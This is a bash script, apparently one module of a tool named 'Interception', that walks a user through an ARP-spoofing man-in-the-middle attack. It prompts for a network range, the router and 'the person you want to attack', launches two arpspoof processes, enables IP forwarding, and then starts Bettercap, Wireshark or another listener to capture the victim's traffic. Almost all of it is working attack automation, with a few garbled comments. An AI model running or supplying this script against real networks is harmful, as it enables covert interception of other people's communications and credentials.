#!/bin/bash

function LineDrawForExternalline()
{
	for (( i=0; i<105; i++ )) 
	{
		printf "-"
  	}
	echo ""
}

if [[ $(id -u) -eq 0 ]]; then
	
	function EN_allcodefiles()
	{
		# I will call this in my main file with English codes and use it there.
     		# I use some of my file (in English) from here, but I don't think it will be very healthy.
     		# Pregnant I will call them inside the main file (Interception) and use them there, I will reduce the heap of code in my main file
     		# and I will be able to perform operations such as updating, adding, removing etc. between language files quickly and easily whenever I want.
     	
     		function LineDrawForInternalLine() 
		{
        		for (( i=0; i<105; i++ )) 
        		{
          			printf "-"
        		}
        		echo ""
     		}
     	
		# The first point from which the attack was started //
	      	printf "Do you want to do the MITM Attack? | \e[1;32mY\e[0m | <| |> | \e[1;32mn\e[0m | : "
	    	read ProgramReply1
	     	LineDrawForInternalLine
     	
	     	if [[ $ProgramReply1 == "Y" ]]; then
			clear
			LineDrawForInternalLine
			printf "Set the interval value to start listening ( Example = \e[1;32m10.0.2.0\e[0m <| |> \e[1;32m192.168.1.0\e[0m ) : "
			read IPBetweenReply
			LineDrawForInternalLine
			
			printf "\nEnter the SubnetMask value ( Example = \e[1;32m24\e[0m ) : " 
			read SubnetMaskValue
			LineDrawForInternalLine
			
			if [[ $SubnetMaskValue -gt 0 ]] && [[ $SubnetMaskValue -lt 32 ]]; then
				printf "\nThe Subnetmask value you entered is \e[1;32m$SubnetMaskValue\e[0m // is in the appropriate range\n"
			else
				printf "\nThe value you entered \e[1;31m$SubnetMaskValue\e[0m dir\nnot in the appropriate range\nthe system automatically defined a value\n"
				SubnetMaskValue=24
			fi		
			
			LineDrawForInternalLine
			
		   	printf "\nThis may take some time\nNetwork Discover will be done\n"
		   	sleep 5
	  
			service NetworkManager restart
	 
	  		# Network scan thanks to the Gnome-Terminal command - new netdiscover command
			# I am able to redirect to a terminal and not break my script.
	  		clear
	  		LineDrawForInternalLine
				
	  	#gnome-terminal --geometry=78x16+0+0 --window \
	  	#--working-directory=/depot --title='.: Network Scan :.' --command="python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue" \
	  
	  		python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue
			sleep 5
	  
	  		printf "\nEnter the Router//device IP address to listen to: "
	  		read RouterIpAdressValue
	  		LineDrawForInternalLine
	 
	  		# Network scan thanks to the Gnome-Terminal command - new netdiscover command
			# I am able to redirect to a terminal and not break my script.
	  
	  	#gnome-terminal --geometry=78x16+1000+0 --window \
	  	#--working-directory=/depot --title='.: Network Scan (for attack) :.' --command="python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue" \
				
			python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue
			sleep 5
	  		printf "\nEnter the IP address of the person you want to attack: "
	  		read AttackPersonIpAddress
	  		LineDrawForInternalLine

			printf "\n"
	  		iwconfig
	   		printf "Enter the interface you will use ( Example : \e[1;36mwlan0\e[0m || \e[1;36meth0\e[0m ) : "
	   		read AllInterfaces

	   		printf "\n\e[1;36mYour interface0\e[0m : $AllInterfaces\n"
	   		LineDrawForInternalLine
	  
	   		printf "MITM is starting . . .\nRouter//Device >>> Starting target attack . . .\nRouter//Device >>> Target attack initiated\n"
	   		LineDrawForInternalLine
	 
	  		# In the same way as Gnome-Terminal, new arp attack (router >>> victim)
			# I'm redirecting to a new terminal so that the arp data can be read from a new table.

	   		sleep 1
	   		clear
		 
	   	gnome-terminal --geometry=78x16+0+500 --window \
	   	--working-directory=/depot --title=' .: Attack 1 :.' --command="arpspoof -i $AllInterfaces -t $RouterIpAdressValue $AttackPersonIpAddress" \
		
			sleep 1
	   		printf "\nTarget >>> Router//Initiating device attack . . .\nDestination >>> Router//Device attack initiated\n"
	   		LineDrawForInternalLine
	  
	  		# In the same way as Gnome-Terminal, the new arp attack (Target >>> router)
			# I'm redirecting to a new terminal so that the arp data can be read from a new table.
	  
	   	gnome-terminal --geometry=78x16+1000+500 --window \
	   	--working-directory=/depot/kn --title='.: Attack 2 :.' --command="arpspoof -i $AllInterfaces -t $AttackPersonIpAddress $RouterIpAdressValue" \
	   
	   		printf "Target -> Router//Device attack . . .\n"
	   		sleep 1
	   		clear
				
			printf "\e[1;34mIP forward\e[0m is starting . . .\n"
			# 'echo 1 > ...'
			# allows us to guide them to the directions they need to go.
		     
		     	echo 1 > /proc/sys/net/ipv4/ip_forward
	    		printf "\e[1;34mIP forward\e[0m is doing . . .\n"
			LineDrawForInternalLine
			sleep 5
			clear
	    
			printf "Do you want to run a listener? | \e[1;34mY\e[0m | <| |> | \e[1;34mn\e[0m | : "
			read listener_reply
			LineDrawForInternalLine
	       
				if [[ $listener_reply == "Y" ]]; then
			  	       	printf "[ \e[1;34mWireshark\e[0m <| |> \e[1;34mBettercap\e[0m <| |> \e[1;34mSwan\e[0m ]\n\n"
			  	       	printf "(1) \e[1;32mBettercap\e[0m\n"
					printf "(2) \e[1;32mWireshark\e[0m\n"
					printf "(3) \e[1;32mSwan\e[0m\n"
		  			printf "\nSelect the listener tool to use: "
			  	       	read listener_type
		               		LineDrawForInternalLine
		   
		  	       		case $listener_type in   
		  
		  	       		1 )

			  	       	service NetworkManager restart
			  	       	printf "\e[1;31mBettercap\e[0m is running\n"
			  	       	LineDrawForInternalLine
			  	       	gnome-terminal --geometry=167x39+0+0 --window \
			  	       	--working-directory=/depot/kn --title='.: Bettercap screen :.' --command="bettercap -iface $AllInterfaces" \
			  
			  	       	;;
		  
		  	       		2 )
		  	       
			  	      	printf "\e[1;36mWireshark\e[0m is running . . .\n"
			  	       	LineDrawForInternalLine
			  	       	wireshark
			  	       	printf "\n\e[1;36mWireshark\e[0m closed\n"
			  	       	echo ""
			  	       
			  	       	;;
		  	       
		  	       		3 )
							
					clear
			  	       	printf "\e[1;36mswan\e[0m is running\n"
			  	       	sleep 3
			  	       	clear
			  	       	chmod +x swan.sh
			  	       	./swan.sh
			  	       	printf "\nSwan closed\n"
			  	       
			  	       	;;
		   
			  	       	* )

			  	       	printf "You entered an incorrect value.\nThe program is closing . . .\n\n"
		       		       	sleep 3
		       		       	printf "The program will restart . . .\n"
		       		       	LineDrawForInternalLine
		       		      	sleep 5
		       		       	clear
		       		       	chmod +x Interception.sh
		  	               	./Interception.sh
			  	       
			  	       	;;
		  
		  	      		esac
		  
	       		  	elif [[ $listener_reply == "n" ]]; then
	       		  		printf "***** Listener not selected *****\n"
	       		  			
	       		  	else
	       		  		printf "You entered an incorrect value.\nThe program is closing . . .\n\n"
	       		  		sleep 3
	  	          		printf "The program will restart . . .\n"
	       		  		LineDrawForInternalLine
	       		 		sleep 5
	       		  		clear
	       		  		chmod +x Interception.sh
	  	          		./Interception.sh
	      		  	fi
	    
	    		  LineDrawForInternalLine
	    	
	    		# The echo 0 statement here stops all ip forwarding operations.
			# There is an ip forward file that opens and closes with echo 0 and 1 in Linux.
			# thus allows us to avoid all processes that will tire our system.
			# We can also call it the point where the attack processes end. 
		       
		     	printf "\e[1;36mIp forward\e[0m is closing . . .\n"
	    	     	echo 0 > /proc/sys/net/ipv4/ip_forward
		    	printf "\e[1;36mIp forward\e[0m closed\n\n"
	    	     	sleep 3
	    	     	LineDrawForInternalLine
			
		elif [[ $ProgramReply1 == "n" ]]; then
			printf "MITM attack will not be done\n"
	  		sleep 2
	  		printf "Program is closing . . .\nProgram closed\n\n"
	  		LineDrawForInternalLine
	  	
	 	else 
	  		printf "\nYou keyed wrong\nProgram kapatılıyor . . .\nProgram closed\n\n"
	  		sleep 3
	  		printf "The program will restart . . .\n"
	  		LineDrawForInternalLine
	  		sleep 5
	  		clear
	  		chmod +x Interception.sh
	  		./Interception.sh
	  	fi
	}
	
	EN_allcodefiles

elif [[ $(id -u) -ne 0 ]]; then
	LineDrawForExternalline
	printf "\n\e[1;31m\t\t\t\tRoot\e[0m not authorized\n\t\t\t\t\e[1;31mRoot\e[0m\n\n\n "
	LineDrawForExternalline
   	exit
	
fi
